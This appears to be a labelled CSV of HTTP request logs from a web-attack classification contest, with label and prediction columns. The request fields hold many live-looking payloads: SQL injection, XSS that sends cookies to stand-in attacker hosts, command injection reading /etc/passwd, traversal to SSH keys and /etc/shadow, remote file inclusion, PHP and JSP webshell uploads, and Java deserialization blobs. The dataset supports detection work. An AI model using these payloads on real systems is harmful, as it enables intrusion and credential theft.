row_id,timestamp,user_agent,method,src_ip,dst_ip,url_path,request_body,attack_type(结果列，需参赛选手判断输出),attack_type_pred
1462,2025-10-21 20:32:16,Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,POST,192.168.25.53,10.251.99.251,/file&test=818,read%3D../../../../etc/mysql/my.cnf980&debug=1,目录遍历攻击,目录遍历攻击
4538,2025-11-11 11:28:58,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,POST,10.210.205.180,10.252.182.162,/useRs,"ID%3d817%20ANd%20IF((SeLECT%20uSer()),slEEP(3),0)",SQL注入攻击,SQL注入攻击
2697,2025-10-19 02:32:56,Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,POST,10.108.208.231,10.253.251.83,/settings,"{""product_id"":991,""quantity"":5}",正常访问,正常访问
7566,2025-11-10 21:38:39,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,POST,192.168.10.143,10.251.10.246,/users,page=608' OR '1'='1'--,SQL注入攻击,SQL注入攻击
10502,2025-11-11 17:38:27,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,POST,192.168.3.94,10.110.62.99,/upload&cache=true,"------WebKitFormBoundary356554
Content-Disposition: form-data; name=""file""; filename=""shell310.php""
Content-Type: application/octet-stream

<?php system($_GET['cmd']); ?>
------WebKitFormBoundary319566--&random=3733",文件上传攻击,文件上传攻击
759,2025-11-08 05:00:00,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,GET,10.53.116.227,10.10.110.141,/api/ping?host=127.0.0.1; cat /etc/passwd&timestamp=1762948282&random=435,,远程命令执行攻击,远程命令执行攻击
8041,2025-10-30 05:21:06,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,POST,10.253.83.6,10.253.68.169,/view,path=../../../config/database171.yml,目录遍历攻击,目录遍历攻击
9230,2025-11-06 22:21:01,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,POST,10.246.69.129,10.244.155.146,/run,target=127.0.0.1168|`id`,远程命令执行攻击,远程命令执行攻击
8707,2025-11-01 07:14:03,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,GET,10.210.110.237,10.244.155.188,/message?content=<iframe src=javascript:alert(878)>,,XSS跨站脚本攻击,XSS跨站脚本攻击
1865,2025-10-20 07:18:00,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,GET,192.168.10.146,10.251.227.109,/api/file?include=../../../../root/.ssh/id_rsa27&test=665&test=665,,目录遍历攻击,目录遍历攻击
10903,2025-11-02 08:50:50,Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,POST,192.168.10.34,10.244.17.165,/deserialize,"rO0ABXNyADRteS5wYWNrYWdlLk15Q2xhc3MAAAAAAAAAAQwAAHhwdwEAHQACAAAAAnNyABFqYXZhLmxhbmcuUnVudGltZQAAAAAAAAAAAAAABXZyABBqYXZhLmxhbmcuU3lzdGVtAAAAAAAAAAAAAABJKWN1cnJlbnRUaW1lTWlsbGlzSmF2YQBAb3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rp
b25zMS5CYXNoZU1hcAAAAAAAAAABWACIAAVtYXB0AA9MamF2YS91dGlsL01hcDt4cHNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDPAwADSQAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAB3CAAAABAAAAAHdAAJbXlPYmplY3R0AAJbQnNyABdqYXZhLmxhbmcuU3RyaW5n063KKLjqYr4CAAFaAAV2YWx1ZXhyABBqYXZhLmxhbmcuT2JqZWN0AAAAAAAAAAAAAAB4cHQABHRlc3R0AAR0cnVleA==217",Java反序列化漏洞利用攻击,Java反序列化漏洞利用攻击
8268,2025-11-05 06:25:46,Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,POST,10.210.108.26,10.60.33.18,/LookUp&cache=true&timestamp=1763341215&random=8414,q=hello524|dir C:\&debug=1&cache=true&test=769,远程命令执行攻击,远程命令执行攻击
8461,2025-11-07 17:17:07,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,GET,10.245.24.224,10.244.155.134,/contact?page=1,,正常访问,正常访问
6137,2025-11-04 01:16:05,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,GET,10.252.189.21,10.253.246.40,/apI/mEssAge?COntenT%3D%3cscrIpT%3edoCUMent.LocatIOn%3d%27htTP://attAckEr155.cOM/sTeal.phP?CoOKIE%3D%27+DocumenT.coOkie%3C/SCRiPT%3E,,XSS跨站脚本攻击,XSS跨站脚本攻击
7336,2025-11-14 21:01:20,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,POST,10.244.191.52,10.210.184.41,/ping,domain=test310.com&&whoami,远程命令执行攻击,远程命令执行攻击
4542,2025-11-17 03:50:54,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,GET,10.246.16.4,10.10.159.189,/post?text%3D%3Cinput%20onfocus%3Dalert(826)%20autofocus%3E&debug=0&debug=0,,XSS跨站脚本攻击,XSS跨站脚本攻击
8397,2025-11-01 01:34:23,Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,GET,10.253.110.37,10.187.76.33,/post?message=<body onload=alert('XSS844')>,,XSS跨站脚本攻击,XSS跨站脚本攻击
3727,2025-10-21 02:36:24,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,GET,192.168.4.177,10.251.212.73,/page?page=http://malicious138.com/shell.txt,,文件包含攻击,文件包含攻击
5162,2025-11-09 09:36:33,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,DELETE,10.187.19.234,10.253.177.27,/login/932,,正常访问,正常访问
10925,2025-11-12 03:20:45,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,GET,10.108.130.231,10.252.191.131,/login,,正常访问,正常访问
436,2025-10-16 17:22:00,Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,PUT,10.9.24.47,10.237.10.61,/api/users,product_id=123&quantity=2,正常访问,正常访问
10322,2025-11-09 11:20:44,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,GET,192.168.10.196,10.251.10.18,/aPi/oRdeRS,,正常访问,正常访问
477,2025-11-06 06:14:00,Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,POST,10.25.189.55,10.153.177.27,/api/ping,q=hello|dir C:\,远程命令执行攻击,远程命令执行攻击
2497,2025-10-29 19:07:15,Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,GET,10.210.21.40,10.251.110.241,/api/products,"id=771 AND IF((SELECT user()),SLEEP(2),0)",SQL注入攻击,SQL注入攻击
2976,2025-10-30 05:47:59,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,POST,10.251.216.112,10.10.159.189,/message,q=<img src=x onerror=alert&#40;740&#41;>,XSS跨站脚本攻击,XSS跨站脚本攻击
4403,2025-11-05 15:21:47,Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,GET,10.251.216.206,10.210.184.39,/message,content=<iframe src=javascript:alert(533)>,XSS跨站脚本攻击,XSS跨站脚本攻击
3184,2025-11-13 13:22:51,Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,GET,10.187.19.219,10.253.177.26,/message,content=<script>document.location='http://attacker822.com/steal.php?cookie='+document.cookie</script>,XSS跨站脚本攻击,XSS跨站脚本攻击
6544,2025-11-08 13:57:20,Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,POST,10.252.168.242,10.16.210.9,/run,target=127.0.0.1637|id,远程命令执行攻击,远程命令执行攻击
10757,2025-10-27 20:35:04,Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,POST,192.168.13.88,10.251.10.50,/process,"rO0ABXNyABFqYXZhLnV0aWwuSGFzaFNldJYGou83gM6gAgABRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAx3CAAAABAAAAAHdAAKamF2YS51dGlsLnNyABFqYXZhLmxhbmcuUnVudGltZQAAAAAAAAAAAAAABXZyABBqYXZhLmxhbmcuU3lzdGVtAAAAAAAAAAAAAABJKWN1cnJlbnRUaW1lTWlsbGlzSmF2YQBAb3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rp
b25zMS5Db25zdGFudE1hcAAAAAAAAAABWACIAAVtYXB0AA9MamF2YS91dGlsL01hcDt4cHcIAAAAQAAAAAJzcgARamF2YS5sYW5nLkludGVnZXIS4qCk94GHOAIAAUkABXZhbHVleHIAEGphdmEubGFuZy5OdW1iZXKGrJUdC5TgiwIAAHhwAAAAAXNyABRqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDPAwADSQAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAB3CAAAABAAAAAHdAAJbXlPYmplY3R0AAJbQnNyABdqYXZhLmxhbmcuU3RyaW5n063KKLjqYr4CAAFaAAV2YWx1ZXhyABBqYXZhLmxhbmcuT2JqZWN0AAAAAAAAAAAAAAB4cHQABHRlc3R0AAR0cnVleA==782",Java反序列化漏洞利用攻击,Java反序列化漏洞利用攻击
10319,2025-10-19 14:52:44,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,POST,10.253.83.6,10.253.68.169,/usErS&test=787,proDuCT%3D312%27;%20wAItFO+r%20DELay%20%2700:00:01%27+--&cache=false&random=7064,SQL注入攻击,SQL注入攻击
2126,2025-11-07 21:52:08,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,GET,10.252.225.7,10.187.20.134,/view?read=../../../../etc/mysql/my.cnf367,,目录遍历攻击,目录遍历攻击
9131,2025-11-04 12:01:23,Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,POST,10.210.68.189,10.244.155.171,/profile/avatar,"------WebKitFormBoundary775573
Content-Disposition: form-data; name=""avatar""; filename=""backdoor51.php""
Content-Type: text/plain

<?php system($_GET['cmd']); ?>
------WebKitFormBoundary49878--",文件上传攻击,文件上传攻击
4693,2025-10-27 09:49:35,Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,POST,10.208.116.197,10.208.54.30,/template,file=php://filter/read+=convert.base64-encode+/resource=config904.ph+p,文件包含攻击,文件包含攻击
1544,2025-10-27 21:54:42,Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,GET,192.168.12.215,10.53.48.195,/ping?q=hello500|cat /etc/passwd,,远程命令执行攻击,远程命令执行攻击
5427,2025-10-27 05:19:27,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,GET,192.168.10.146,10.251.99.247,/execute,target=127.0.0.1481|`id`,远程命令执行攻击,远程命令执行攻击
6176,2025-10-19 03:58:18,Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,GET,192.168.14.28,10.251.99.249,/api/products,,正常访问,正常访问
6567,2025-11-13 18:52:07,Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,GET,10.253.92.7,10.10.228.197,/search?filter%3Dactive&cache=false,,正常访问,正常访问
1330,2025-11-03 14:54:01,Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,POST,192.168.21.45,10.251.96.250,/delete-account,email=attacker816@example.com&role=admin,CSRF攻击,CSRF攻击
7637,2025-10-30 20:45:43,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,GET,10.253.110.39,10.187.76.78,/settings,,正常访问,正常访问
10768,2025-11-05 20:59:40,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,POST,10.187.37.224,10.253.58.75,/api/restore,"rO0ABXNyABFqYXZhLnV0aWwuSGFzaFNldJYGou83gM6gAgABRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAx3CAAAABAAAAAHdAAKamF2YS51dGlsLnNyABFqYXZhLmxhbmcuUnVudGltZQAAAAAAAAAAAAAABXZyABBqYXZhLmxhbmcuU3lzdGVtAAAAAAAAAAAAAABJKWN1cnJlbnRUaW1lTWlsbGlzSmF2YQBAb3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rp
b25zMS5Db25zdGFudE1hcAAAAAAAAAABWACIAAVtYXB0AA9MamF2YS91dGlsL01hcDt4cHcIAAAAQAAAAAJzcgARamF2YS5sYW5nLkludGVnZXIS4qCk94GHOAIAAUkABXZhbHVleHIAEGphdmEubGFuZy5OdW1iZXKGrJUdC5TgiwIAAHhwAAAAAXNyABRqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDPAwADSQAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAB3CAAAABAAAAAHdAAJbXlPYmplY3R0AAJbQnNyABdqYXZhLmxhbmcuU3RyaW5n063KKLjqYr4CAAFaAAV2YWx1ZXhyABBqYXZhLmxhbmcuT2JqZWN0AAAAAAAAAAAAAAB4cHQABHRlc3R0AAR0cnVleA==29",Java反序列化漏洞利用攻击,Java反序列化漏洞利用攻击
5794,2025-11-15 15:52:15,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,GET,192.168.26.48,10.70.1.194,"/products?id=334 UNION SELECT 1,2,3,4,5,6--",,SQL注入攻击,SQL注入攻击
1437,2025-11-16 14:26:15,Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,PUT,10.187.74.33,10.252.158.86,/api/users,name=User8161&email=user2785@example.com&message=Hello,正常访问,正常访问
1863,2025-10-18 18:48:01,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,POST,10.253.83.6,10.253.68.169,/SETtINgs&random=1935&test=633&debug=0,"{""USErnaMe"":""uSer4185"",""pAssw+OrD"":""secreT9893""}&random=224+2&timestamp=1763347157&debug=+0",正常访问,正常访问
10091,2025-10-27 03:51:02,Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,PUT,10.251.96.169,10.210.184.38,/products,"{""username"":""user800"",""password"":""secret467""}",正常访问,正常访问
7204,2025-11-16 13:49:33,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,GET,10.187.37.190,10.252.110.85,/contact?limit=10,,正常访问,正常访问
4757,2025-11-07 04:06:23,Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,GET,10.108.130.81,10.252.18.1,/contact?limit=10,,正常访问,正常访问
6618,2025-11-13 07:59:03,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,GET,192.168.10.250,10.156.70.239,/fIle?dOcument%3d../../../../WinDOwS/system32/DrivErS/eTC/hosts903,,目录遍历攻击,目录遍历攻击
5267,2025-10-25 02:34:18,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,POST,192.168.10.59,10.251.10.18,/api/restore,"rO0ABXNyABFqYXZhLnV0aWwuSGFzaFNldJYGou83gM6gAgABRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAx3CAAAABAAAAAHdAAKamF2YS51dGlsLnNyABFqYXZhLmxhbmcuUnVudGltZQAAAAAAAAAAAAAABXZyABBqYXZhLmxhbmcuU3lzdGVtAAAAAAAAAAAAAABJKWN1cnJlbnRUaW1lTWlsbGlzSmF2YQBAb3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rp
b25zMS5Db25zdGFudE1hcAAAAAAAAAABWACIAAVtYXB0AA9MamF2YS91dGlsL01hcDt4cHcIAAAAQAAAAAJzcgARamF2YS5sYW5nLkludGVnZXIS4qCk94GHOAIAAUkABXZhbHVleHIAEGphdmEubGFuZy5OdW1iZXKGrJUdC5TgiwIAAHhwAAAAAXNyABRqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDPAwADSQAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAB3CAAAABAAAAAHdAAJbXlPYmplY3R0AAJbQnNyABdqYXZhLmxhbmcuU3RyaW5n063KKLjqYr4CAAFaAAV2YWx1ZXhyABBqYXZhLmxhbmcuT2JqZWN0AAAAAAAAAAAAAAB4cHQABHRlc3R0AAR0cnVleA==928",Java反序列化漏洞利用攻击,Java反序列化漏洞利用攻击
10521,2025-10-29 13:40:12,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,GET,10.252.225.7,10.187.20.133,/api/include?include%3Dphp://filter/resource%3D/etc/passwd460&debug=1&cache=false,,文件包含攻击,文件包含攻击
3293,2025-10-30 13:01:42,Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,GET,10.244.33.165,10.10.159.189,/execute,address=127.0.0.1728; net user,远程命令执行攻击,远程命令执行攻击
9729,2025-10-31 23:35:19,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,POST,10.210.108.26,10.60.33.18,/contact,"{""name"":""User2722"",""email"":""user2433@example.com"",""message"":""Hello""}",正常访问,正常访问
10398,2025-10-18 18:02:21,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,GET,192.168.11.231,10.18.66.101,/api/include,file=expect://whoami,文件包含攻击,文件包含攻击
3036,2025-10-23 04:58:14,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,GET,10.187.37.224,10.253.58.75,/SeARch&random=6261&cache=true,text%3D%3CInput%20OnFoCus%3daLeRt(426)%20aUtOfocUS%3E&timestamp=1763339782&test=465,XSS跨站脚本攻击,XSS跨站脚本攻击
1307,2025-11-01 00:19:28,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,POST,192.168.17.100,10.251.227.70,/register,name=User6958&email=user8074@example.com&message=Hello,正常访问,正常访问
10558,2025-10-30 13:27:41,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,POST,10.253.83.6,10.253.68.169,/profile/avatar,"------WebKitFormBoundary842532
Content-Disposition: form-data; name=""avatar""; filename=""backdoor879.jsp""
Content-Type: application/octet-stream

<% Runtime.getRuntime().exec(request.getParameter(""cmd"")); %>
------WebKitFormBoundary234687--",文件上传攻击,文件上传攻击
4593,2025-10-28 23:50:32,Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,PUT,192.168.24.87,10.251.99.251,/search/356,q=query1057&category=books,正常访问,正常访问
2654,2025-11-16 14:55:48,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,POST,10.187.69.152,10.253.58.75,/api/products,product=31'; WAITFOR DELAY '00:00:01'--,SQL注入攻击,SQL注入攻击
4933,2025-11-10 05:29:41,Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,DELETE,10.108.130.236,10.252.184.165,/api/products,,正常访问,正常访问
6919,2025-10-20 05:48:56,Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,POST,192.168.24.135,10.251.99.251,/delete-account,redirect_url=http://malicious102.com&token=bypass,CSRF攻击,CSRF攻击
7804,2025-11-03 21:28:29,Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,POST,10.108.208.231,10.253.176.212,/process&timestamp=1763346468&test=115,"rO0ABXNyABFqYXZhLnV0aWwuSGFzaFNldJYGou83gM6gAgABRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAx3CAAAABAAAAAHdAAKamF2YS51dGlsLnNyABFqYXZhLmxhbmcuUnVudGltZQAAAAAAAAAAAAAABXZyABBqYXZhLmxhbmcuU3lzdGVtAAAAAAAAAAAAAABJKWN1cnJlbnRUaW1lTWlsbGlzSmF2YQBAb3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rp
b25zMS5Db25zdGFudE1hcAAAAAAAAAABWACIAAVtYXB0AA9MamF2YS91dGlsL01hcDt4cHcIAAAAQAAAAAJzcgARamF2YS5sYW5nLkludGVnZXIS4qCk94GHOAIAAUkABXZhbHVleHIAEGphdmEubGFuZy5OdW1iZXKGrJUdC5TgiwIAAHhwAAAAAXNyABRqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDPAwADSQAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAB3CAAAABAAAAAHdAAJbXlPYmplY3R0AAJbQnNyABdqYXZhLmxhbmcuU3RyaW5n063KKLjqYr4CAAFaAAV2YWx1ZXhyABBqYXZhLmxhbmcuT2JqZWN0AAAAAAAAAAAAAAB4cHQABHRlc3R0AAR0cnVleA%3D%3D80&cache=false",Java反序列化漏洞利用攻击,Java反序列化漏洞利用攻击
6790,2025-11-12 12:24:46,Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,POST,192.168.20.148,10.251.99.239,/pROCesS,"ro0abxnyADRTeS5wyWnrYwdllk15Q2xhc3mAAaAAAaaaaqwAAHHWDwEAHqaCaAaaAnNyAbfqYxZhLmXhbmcuunVudgltZQAAaAAAaAAAAAaAbXzYABbqyXzhLmxhbmcuu3Lzd+GvTaAaAaAAaAAaaaAbJKWn1CnJlbnRUaW1lTWlsbGLzsmF2YqbaB3JNLmfWYWNOzS5Jb21TB25zlmNvbgXlY3Rp
b25zmS5cYxnozU1HcAaAAAaAAaabWaCiAavTYxB0AA9ma+MF2YS91dGLsL01hcdt4chnyabFQyXZhLnv0aWWusGFzaE1HcAUH2SHDFmDPaWaDSqaKbG9hZEZhy3RvckKACXrocmVzag9sZhHwP0aAAAAAAab3CAAaABaAAAahdAaJbxlPYm+PLY3r0AAJbqnNYaBDqyXzhLmxhbMcuU3RyaW5n063kKLjqYr4CAAFaAAV2Ywx1ZXhyaBbqYXZHlmXHbMcuT2JQZWN0aAaAAaaaAaAAAAB4cHQABhrlc3R0Aar0cnvlEa==934",Java反序列化漏洞利用攻击,Java反序列化漏洞利用攻击
6350,2025-11-14 15:20:45,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,GET,10.253.250.221,10.10.130.86,/aPI/execUTe,AdDress%3D127.0.0.1954;%20$(lS%20-la),远程命令执行攻击,远程命令执行攻击
2687,2025-10-28 13:43:59,Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,POST,10.253.83.6,10.253.68.169,/search,domain=test586.com&$(whoami),远程命令执行攻击,远程命令执行攻击
3445,2025-10-28 13:22:19,Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,GET,10.187.19.201,10.253.177.28,/ping&test=347&random=7703,target=127.0.0.1181|id&random=855&debug=1,远程命令执行攻击,远程命令执行攻击
9334,2025-11-08 06:56:08,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,POST,10.253.110.39,10.187.76.33,/api/restore,"rO0ABXNyABFqYXZhLnV0aWwuSGFzaFNldJYGou83gM6gAgABRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAx3CAAAABAAAAAHdAAKamF2YS51dGlsLnNyABFqYXZhLmxhbmcuUnVudGltZQAAAAAAAAAAAAAABXZyABBqYXZhLmxhbmcuU3lzdGVtAAAAAAAAAAAAAABJKWN1cnJlbnRUaW1lTWlsbGlzSmF2YQBAb3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rp
b25zMS5Db25zdGFudE1hcAAAAAAAAAABWACIAAVtYXB0AA9MamF2YS91dGlsL01hcDt4cHcIAAAAQAAAAAJzcgARamF2YS5sYW5nLkludGVnZXIS4qCk94GHOAIAAUkABXZhbHVleHIAEGphdmEubGFuZy5OdW1iZXKGrJUdC5TgiwIAAHhwAAAAAXNyABRqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDPAwADSQAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAB3CAAAABAAAAAHdAAJbXlPYmplY3R0AAJbQnNyABdqYXZhLmxhbmcuU3RyaW5n063KKLjqYr4CAAFaAAV2YWx1ZXhyABBqYXZhLmxhbmcuT2JqZWN0AAAAAAAAAAAAAAB4cHQABHRlc3R0AAR0cnVleA==145",Java反序列化漏洞利用攻击,Java反序列化漏洞利用攻击
9174,2025-10-25 19:51:12,Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,GET,10.250.71.58,10.244.155.188,/blog,,正常访问,正常访问
4564,2025-11-05 00:57:17,Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,PUT,10.246.16.4,10.10.159.189,/settings/304,name%3DUser4340%26email%3Duser8503@example.com%26message%3DHello,正常访问,正常访问
7030,2025-11-12 06:36:58,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,PUT,10.187.19.197,10.253.177.28,/api/orders,product_id=308&quantity=3,正常访问,正常访问
1273,2025-10-26 17:56:05,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,GET,192.168.6.127,10.251.227.4,/commeNt?meSsagE=<bOdY OnLoAd=alErt('Xss263')>,,XSS跨站脚本攻击,XSS跨站脚本攻击
583,2025-11-07 15:25:00,Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,GET,10.25.73.35,10.168.2.16,/static,page=../../../etc/shadow,目录遍历攻击,目录遍历攻击
911,2025-10-24 20:51:00,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,PUT,10.25.189.55,10.153.251.83,/abOuT/123&cache=false&timestamp=1762948282&cache=false,PrOdUCt_id=123&qUAntiTy=2&timestamp=1762948282&cache=false&timestamp=1762948282,正常访问,正常访问
6372,2025-11-13 15:48:53,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,POST,192.168.21.37,10.251.98.17,/process,"rO0ABXNyADRteS5wYWNrYWdlLk15Q2xhc3MAAAAAAAAAAQwAAHhwdwEAHQACAAAAAnNyABFqYXZhLmxhbmcuUnVudGltZQAAAAAAAAAAAAAABXZyABBqYXZhLmxhbmcuU3lzdGVtAAAAAAAAAAAAAABJKWN1cnJlbnRUaW1lTWlsbGlzSmF2YQBAb3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rp
b25zMS5CYXNoZU1hcAAAAAAAAAABWACIAAVtYXB0AA9MamF2YS91dGlsL01hcDt4cHNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDPAwADSQAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAB3CAAAABAAAAAHdAAJbXlPYmplY3R0AAJbQnNyABdqYXZhLmxhbmcuU3RyaW5n063KKLjqYr4CAAFaAAV2YWx1ZXhyABBqYXZhLmxhbmcuT2JqZWN0AAAAAAAAAAAAAAB4cHQABHRlc3R0AAR0cnVleA==608",Java反序列化漏洞利用攻击,Java反序列化漏洞利用攻击
4884,2025-11-07 23:17:44,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,POST,10.253.83.6,10.253.68.169,/view,load=../../../WEB-INF/web.xml76,目录遍历攻击,目录遍历攻击
2474,2025-10-20 03:47:18,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,POST,10.251.216.206,10.210.184.39,/comment,q=<img src=x onerror=alert(549)>,XSS跨站脚本攻击,XSS跨站脚本攻击
8876,2025-10-23 19:29:07,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,GET,10.210.94.202,10.244.155.141,/lookup?domain=test642.com&$(whoami),,远程命令执行攻击,远程命令执行攻击
